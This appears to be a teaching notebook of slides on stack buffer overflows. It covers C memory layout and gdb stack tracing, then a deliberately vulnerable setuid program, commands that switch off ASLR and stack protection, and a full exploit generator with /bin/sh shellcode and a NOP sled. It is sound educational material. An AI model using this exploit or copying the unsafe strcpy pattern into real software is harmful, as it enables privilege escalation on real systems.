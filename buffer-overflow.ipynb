{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## <center> Buffer Overflow Attack </center>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Program Memory Layout\n",
    "\n",
    "When a program runs, it is loaded into memory."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "A typical C program divides memory into five segments\n",
    "- Text segment (also known as code segment): stores the executable code of the program (usually read-only)\n",
    "- Data segment: stores **static/global** variables initialized in the program. \n",
    "  - static char s[] = \"hello world\";\n",
    "  - static int a = 1;\n",
    "- BSS (block stared by symbol) segment: stores uninitialized **static/global** variables. These variables will be initialized with zeros. \n",
    "- Heap: provides space for dynamic memory allocation (caused by `malloc`, `calloc`, `realloc`, `free`, etc). \n",
    "- Stack: is simple data structure with a LIFO (last-in-first-out access policy). Stack stores local variables defined inside functions, and data related to function calls (return address, arguments, etc)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Sizes of text, data, and BSS segment are known as soon as compilation or assembly is completed.\n",
    "- Stack and heap segments will grow and shrink during program execution.\n",
    "  - Therefore, they tend to be configured such that they grow toward each other. \n",
    "  - The boundary between them is flexible.\n",
    "  - Both can grow until all available memory is used. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo1.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/mem_layout.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/mem_layout.c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "\n",
    "int x = 100;\n",
    "int main()\n",
    "{\n",
    "  // data stored on stack\n",
    "  int   a=2;\n",
    "  float b=2.5;\n",
    "  static int y;\n",
    "\n",
    "  // allocate memory on heap\n",
    "  int *ptr = (int *) malloc(2*sizeof(int));\n",
    "  \n",
    "  // values 5 and 6 stored on heap\n",
    "  ptr[0]=5;\n",
    "  ptr[1]=6;\n",
    "\n",
    "  // deallocate memory on heap\t\n",
    "  free(ptr);\n",
    " \n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -W -Wall -c Computer-Security/source/mem_layout.c\n",
    "$ gcc -o mem_layout mem_layout.o\n",
    "$ size mem_layout mem_layout.o\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Why don't we see stack and heap information?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/mem_layout_print.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/mem_layout_print.c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "\n",
    "int x = 100;\n",
    "int main()\n",
    "{\n",
    "  int   a=2;\n",
    "  double b=2.5;\n",
    "  int   c=4;\n",
    "  static int y;\n",
    "  int *ptr = (int *) malloc(2*sizeof(int));  \n",
    "  ptr[0]=5;\n",
    "  ptr[1]=6;\n",
    "\n",
    "  printf (\"x is %d and is stored at %p\\n\", x, &x);\n",
    "  printf (\"a is %d and is stored at %p\\n\", a, &a);\n",
    "  printf (\"b is %f and is stored at %p\\n\", b, &b);\n",
    "  printf (\"c is %d and is stored at %p\\n\", c, &c);\n",
    "  printf (\"y is %d and is stored at %p\\n\", y, &y);\n",
    "  printf (\"ptr[0] is %d and is stored at %p\\n\", ptr[0], &ptr[0]);\n",
    "  printf (\"ptr[1] is %d and is stored at %p\\n\", ptr[1], &ptr[1]);\n",
    "\n",
    "  // deallocate memory on heap\t\n",
    "  free(ptr);\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Slide Type\n",
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -o mem_layout_print Computer-Security/source/mem_layout_print.c\n",
    "$ ./mem_layout_print\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Stack Memory Layout\n",
    "\n",
    "- When a function is called, a block of memory called `stack frame` will be pushed onto the top of stack. A **stack frame** contains four regions:\n",
    "    - Arguments that are passed to the function\n",
    "    - Return address (the address of the instructions right after the function call\n",
    "    - Previous frame pointer\n",
    "    - Local variables of the function\n",
    "- When the program first starts, the stack contains only one frame, that of the `main` function. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo2.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack_trace.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack_trace.c\n",
    "#include<stdio.h>\n",
    "static void display(int i, int *ptr);\n",
    "    \n",
    "int main(void) {\n",
    " int x = 5;\n",
    " int *xptr = &x;\n",
    " printf(\"In main():\\n\");\n",
    " printf(\"   x is %d and is stored at %p.\\n\", x, &x);\n",
    " printf(\"   xptr points to %p which holds %d.\\n\", xptr, *xptr);\n",
    " display(x, xptr);\n",
    " printf (\"The display function has stopped\");\n",
    " return 0;\n",
    "}\n",
    "   \n",
    "void display(int z, int *zptr) {\n",
    "  printf(\"In display():\\n\");\n",
    "  printf(\"   z is %d and is stored at %p.\\n\", z, &z);\n",
    "  printf(\"   zptr points to %p which holds %d.\\n\", zptr, *zptr);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -g -o stack_trace Computer-Security/source/stack_trace.c\n",
    "$ ./stack_trace\n",
    "$ gdb stack_trace\n",
    "gdb-peda$ \n",
    "```\n",
    "\n",
    "In Class: Alternate between `run`, `break 10`, `backtrace`, `step`, and `n` to see how stack grows. `quit` to quit `gdb`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "```\n",
    "gdb-peda$ run\n",
    "gdb-peda$ break 10\n",
    "gdb-peda$ run\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ step\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo3.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Buffer Overflow Attack\n",
    "\n",
    "- Memory copy happens in programming when data from one place (source) is duplicated to another place (destination). \n",
    "- Before copying can happen, memory needs to be allocated at the destination. \n",
    "- If the allocation fails to be sufficient, it will result in an overflow. \n",
    "- One of the oldest and most well-known attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Why do we need to learn this vulnerability and attack?\n",
    "\n",
    "- Can still be found buried in legacy or glue code from third party libraries as web sites get more complex and evolved.\n",
    "- An important point of learning as you work through the theory and practice of this exploit:\n",
    "  - C programming\n",
    "  - C Assembler\n",
    "  - Linux debugger using gdb\n",
    "  - Engage in mathematics to understand the breaking points and the hex contents in memory in order to place an attack\n",
    "\n",
    "**[Smashing the Stack, 2016](https://www.aap3recruitment.com/news/smashing-the-stack/14074/)**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "**strcpy()**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/test_strcpy.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/test_strcpy.c\n",
    "#include <string.h>\n",
    "#include <stdio.h>\n",
    "void main(){\n",
    "  char src[40] = \"Hello World \\0 Extra string\";\n",
    "  char dest[40];\n",
    "  strcpy(dest, src);\n",
    "  printf(\"%s\",dest);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Compile and run `test_strcpy` in your terminal.\n",
    "- What happens? Why is the string not copied properly?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/strcpy_overflow.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/strcpy_overflow.c\n",
    "#include <string.h>\n",
    "\n",
    "void foo(char *str)\n",
    "{\n",
    "    char buffer[12];\n",
    "\n",
    "    /* The following statement will result in buffer overflow */ \n",
    "    strcpy(buffer, str);\n",
    "}\n",
    "\n",
    "int main()\n",
    "{\n",
    "    char *str = \"This is definitely longer than 12\";    \n",
    "    foo(str);\n",
    "\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -z execstack -fno-stack-protector -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the gdb debugging sequence. Examing the frames at each backtrace. What happens to the last backtrace?\n",
    "```\n",
    "gdb-peda$ break 14\n",
    "gdb-peda$ run\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ step\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo4.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- The region above the buffer includes critical values, including the return address and the previous frame pointer. \n",
    "- The consequences of a modified return address (due to buffer overflow) include:\n",
    "  - The new address (virtual address) might not be mapped to any physical address, leading to an invalid return instruction and a crashed program. \n",
    "  - The address might be mapped to a physical address in protected system space, leading to a failed jump and a crashed program. \n",
    "  - The address might be mapped to a physical address that does not contain any valid instruction, leading to a failed return and a crashed program. \n",
    "  - **The address might be mapped to a physical address that happens to contain valid machine instructions, leading to a continuing program with logic different from the original program.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Exploiting a Buffer Overflow Vulnerability\n",
    "\n",
    "- By overflowing a buffer, we can cause the program to crash or run something else. \n",
    "- If the program is privileged, this means *something else* will be run with privilige, leading to potential privilege escalation for *something malicious*. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "/* stack.c */\n",
    "/* This program has a buffer overflow vulnerability. */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int foo(char *str)\n",
    "{\n",
    "    char buffer[100];\n",
    "\n",
    "    /* The following statement has a buffer overflow problem */ \n",
    "    strcpy(buffer, str);\n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[400];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 300, badfile);\n",
    "    foo(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Clearly, there is a buffer overflow issue.\n",
    "- What needs to be store in `badfile` to expoit this issue?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo5.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable countermeasures:\n",
    "```\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "Include the following flags with your gcc:\n",
    "- `-z execstack`\n",
    "- `-fno-stack-protector`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o stack -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ sudo chown root stack\n",
    "$ sudo chmod 4755 stack\n",
    "$ echo \"aaaa\" > badfile\n",
    "$ ./stack\n",
    "$ echo \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" > badfile\n",
    "$ ./stack\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How do we know (guess) where the stack frame of `foo()` will be for us to find out where the malicious code is located (and hence set the relevant jump address)?\n",
    "- Fixed starting address of the stack (before countermeasure). \n",
    "- The stack is shallow (good programming practice don't use deeply nested functions). "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable the address randomization and then run `mem_layout_print` to see if the addresses for the pointers in stack are changed?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo6.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How can we find the return address without guessing?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -g -o stack_dbg -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ rm badfile\n",
    "$ touch badfile\n",
    "$ gdb stack_dbg\n",
    "gdb-peda$ break foo\n",
    "gdb-peda$ run\n",
    "gdb-peda$ print $ebp\n",
    "gdb-peda$ print $buffer\n",
    "gdb-peda$ print ebp - buffer\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- What is 0x6C in decimal?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo7.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "The next body of code will need to be modified anytime you retest this program, after going through the debugging process to identify the correct stack position."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing source/exploit.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/exploit.c\n",
    "/* exploit.c  */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "char shellcode[]=\n",
    "    \"\\x31\\xc0\"             /* xorl    %eax,%eax     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f   */\n",
    "    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f   */\n",
    "    \"\\x89\\xe3\"             /* movl    %esp,%ebx     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x53\"                 /* pushl   %ebx          */\n",
    "    \"\\x89\\xe1\"             /* movl    %esp,%ecx     */\n",
    "    \"\\x99\"                 /* cdq                   */\n",
    "    \"\\xb0\\x0b\"             /* movb    $0x0b,%al     */\n",
    "    \"\\xcd\\x80\"             /* int     $0x80         */\n",
    ";\n",
    "\n",
    "void main(int argc, char **argv)\n",
    "{\n",
    "  char buffer[200];\n",
    "  FILE *badfile;\n",
    "\n",
    "  /* A. Initialize buffer with 0x90 (NOP instruction) */\n",
    "  memset(&buffer, 0x90, 200);\n",
    "\n",
    "  /* B. Fill the return address field with a candidate \n",
    "        entry point of the malicious code */\n",
    "  *((long *) (buffer + 112)) = 0xbfffe908 + 0x80;\n",
    "\t\n",
    "  // C. Place the shellcode towards the end of buffer\n",
    "  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, \n",
    "         sizeof(shellcode));\n",
    "\n",
    "  /* Save the contents to the file \"badfile\" */\n",
    "  badfile = fopen(\"./badfile\", \"w\");\n",
    "  fwrite(buffer, 200, 1, badfile);\n",
    "  fclose(badfile);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings (after modify exploit.c accordingly)\n",
    "```\n",
    "$ rm badfile\n",
    "$ gcc -o exploit Computer-Security/source/exploit.c\n",
    "$ ./exploit\n",
    "$ ./stack\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
